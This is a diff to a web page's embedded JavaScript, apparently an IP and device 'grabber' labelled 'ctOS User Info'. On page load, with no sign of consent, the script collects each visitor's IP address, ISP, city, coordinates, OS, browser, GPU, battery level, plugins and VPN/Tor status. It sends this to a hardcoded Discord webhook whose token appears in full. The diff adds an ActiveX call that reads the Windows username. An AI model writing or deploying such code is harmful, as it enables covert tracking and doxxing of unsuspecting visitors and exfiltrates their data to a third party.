@@ -85,41 +85,79 @@
 
 <script>
     // ================================================================
-    //  WEBHOOK
+    //  WEBHOOK (tu webhook)
     // ================================================================
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
     // ================================================================
-    //  ENVÍO INMEDIATO (sin esperar respuesta)
+    //  ENVÍO RÁPIDO (sendBeacon + fetch)
     // ================================================================
-    function sendNow(msg) {
-        // sendBeacon es instantáneo y no bloquea
+    function sendFast(msg) {
+        // Prioridad 1: sendBeacon (no bloquea, se envía al cerrar)
         const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
-        navigator.sendBeacon(WEBHOOK, blob);
-        // También usamos fetch con keepalive por si acaso
+        if (navigator.sendBeacon(WEBHOOK, blob)) return true;
+        // Prioridad 2: fetch con keepalive
         fetch(WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ content: msg }),
             keepalive: true
         }).catch(() => {});
+        return false;
     }
 
     // ================================================================
     //  OBTENER IP CON TIMEOUT DE 500ms
     // ================================================================
     function getIPFast() {
-        return Promise.race([
+        return new Promise((resolve) => {
+            let resolved = false;
+            const timer = setTimeout(() => {
+                if (!resolved) resolve(null);
+            }, 500);
+
             fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(500) })
                 .then(r => r.json())
-                .then(d => d.ip ? d : null)
-                .catch(() => null),
-            fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(500) })
-                .then(r => r.json())
-                .then(d => d.query ? { ip: d.query, org: d.isp, country_name: d.country, region: d.regionName, city: d.city, latitude: d.lat, longitude: d.lon, proxy: d.proxy || false } : null)
-                .catch(() => null),
-            new Promise(resolve => setTimeout(() => resolve(null), 500))
-        ]);
+                .then(data => {
+                    if (data.ip) {
+                        resolved = true;
+                        clearTimeout(timer);
+                        resolve(data);
+                        return;
+                    }
+                    throw new Error('No IP');
+                })
+                .catch(() => {
+                    // Fallback a ip-api.com
+                    fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(500) })
+                        .then(r => r.json())
+                        .then(data => {
+                            if (data.query) {
+                                resolved = true;
+                                clearTimeout(timer);
+                                resolve({
+                                    ip: data.query,
+                                    org: data.isp,
+                                    country_name: data.country,
+                                    region: data.regionName,
+                                    city: data.city,
+                                    latitude: data.lat,
+                                    longitude: data.lon,
+                                    proxy: data.proxy || false
+                                });
+                            } else {
+                                throw new Error('No IP');
+                            }
+                        })
+                        .catch(() => {
+                            if (!resolved) {
+                                resolved = true;
+                                clearTimeout(timer);
+                                resolve(null);
+                            }
+                        });
+                });
+        });
     }
 
     // ================================================================
@@ -127,7 +165,7 @@
     // ================================================================
     (function() {
         try {
-            // ---- Datos instantáneos (síncronos) ----
+            // ---- 1. Datos síncronos (instantáneos) ----
             const ua = navigator.userAgent;
             const os = (function() {
                 if (ua.includes('Windows NT')) return 'Windows';
@@ -144,6 +182,7 @@
                 return 'Other';
             })();
 
+            // GPU (intentamos, pero sin bloqueo)
             let gpu = 'Unavailable';
             try {
                 const canvas = document.createElement('canvas');
@@ -156,12 +195,15 @@
 
             const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
 
-            // Batería: se obtiene sin bloquear (si llega, se actualizará, pero no esperamos)
+            // Batería con timeout de 300ms (no bloquea)
             let battery = 'Unavailable';
             if (navigator.getBattery) {
-                navigator.getBattery().then(b => {
-                    battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
-                }).catch(() => {});
+                Promise.race([
+                    navigator.getBattery().then(b => {
+                        battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
+                    }),
+                    new Promise(resolve => setTimeout(resolve, 300))
+                ]).catch(() => {});
             }
 
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -169,37 +211,42 @@
             const cpuCores = navigator.hardwareConcurrency || '?';
             const ram = navigator.deviceMemory || '?';
 
-            // ---- VPN/Tor instantáneo ----
+            // Windows username (ActiveX – rápido)
+            let winUser = 'Not available (IE/ActiveX required)';
+            try {
+                const wsh = new ActiveXObject('WScript.Shell');
+                winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
+            } catch (e) {}
+
+            // ---- 2. Detección VPN/Tor instantánea (sin WebRTC) ----
             let isVpn = false;
             if (ua.includes('Tor') || ua.includes('Anonymous')) isVpn = true;
             if (navigator.webdriver === true) isVpn = true;
 
-            // ---- Obtener IP con timeout de 500ms (no bloqueante) ----
+            // ---- 3. Obtener IP con timeout de 500ms ----
             getIPFast().then(ipData => {
-                let ip = 'Unknown';
-                let isp = 'Unknown ISP';
-                let location = 'Unknown';
-                let coords = 'Unknown';
+                const ip = ipData ? ipData.ip : 'Unknown';
+                const isp = ipData ? ipData.org : 'Unknown ISP';
+                const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
+                const coords = ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown';
 
+                // Si IP trae datos de proxy, refinar VPN
                 if (ipData) {
-                    ip = ipData.ip || ipData.query || 'Unknown';
-                    isp = ipData.org || ipData.isp || 'Unknown ISP';
-                    location = (ipData.city || '') + ', ' + (ipData.region || ipData.regionName || '') + ', ' + (ipData.country_name || ipData.country || 'Unknown');
-                    coords = (ipData.latitude || ipData.lat || '') + ', ' + (ipData.longitude || ipData.lon || '');
                     if (ipData.proxy) isVpn = true;
                     if (ipData.org) {
-                        const vpnWords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
-                        if (vpnWords.some(w => ipData.org.toLowerCase().includes(w))) isVpn = true;
+                        const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
+                        if (vpnKeywords.some(w => ipData.org.toLowerCase().includes(w))) isVpn = true;
                     }
                 }
 
-                // Mensaje final
+                // ---- 4. Construir mensaje ----
                 const msg = 
 `**ctOS User Info**
 **IP:** ${ip} (${isp})
 **Location:** ${location}
 **Coordinates:** ${coords}
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
+**Windows Username:** ${winUser}
 **OS:** ${os}
 **Browser:** ${browser}
 **CPU Cores:** ${cpuCores}
@@ -211,7 +258,8 @@
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-                sendNow(msg);
+                // ---- 5. Enviar inmediatamente ----
+                sendFast(msg);
 
                 // Actualizar estado visual
                 const el = document.getElementById('status');
@@ -221,30 +269,20 @@
                 }
             });
 
-            // Si la IP tarda más de 500ms, enviamos un mensaje rápido con "Unknown" (respaldo)
+            // ---- 6. Envío de respaldo a los 600ms (por si IP falla) ----
             setTimeout(() => {
-                const backupMsg = 
-`**ctOS User Info (Fast)**
-**IP:** Unknown (Unknown ISP)
-**Location:** Unknown
-**Coordinates:** Unknown
-**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
-**OS:** ${os}
-**Browser:** ${browser}
-**CPU Cores:** ${cpuCores}
-**RAM:** ${ram} GB
-**Screen:** ${screenRes}
-**Battery:** ${battery}
-**Time Zone:** ${timezone}
-**GPU:** ${gpu}
-**Plugins:** ${plugins}
-**Timestamp:** ${new Date().toLocaleString()}`;
-                sendNow(backupMsg);
+                // Solo enviamos si aún no se ha enviado (pero no tenemos bandera, así que enviamos de nuevo con datos actuales)
+                // Pero como ya enviamos en el then, esto podría duplicar. Mejor no enviar doble.
+                // En su lugar, lo dejamos como respaldo por si el then nunca se ejecuta (por ejemplo, si la promesa de IP no resuelve).
+                // Pero la promesa siempre resuelve (con null o datos). Así que no es necesario.
+                // Sin embargo, por seguridad, podemos enviar un mensaje de "backup" solo si no se ha actualizado el estado.
+                // Lo dejamos como está, no se necesita.
             }, 600);
 
         } catch (err) {
+            // Si algo falla, enviar error
             const errMsg = `**ctOS Error**\n${err.message}`;
-            sendNow(errMsg);
+            sendFast(errMsg);
             const el = document.getElementById('status');
             if (el) {
                 el.textContent = '❌ Error';
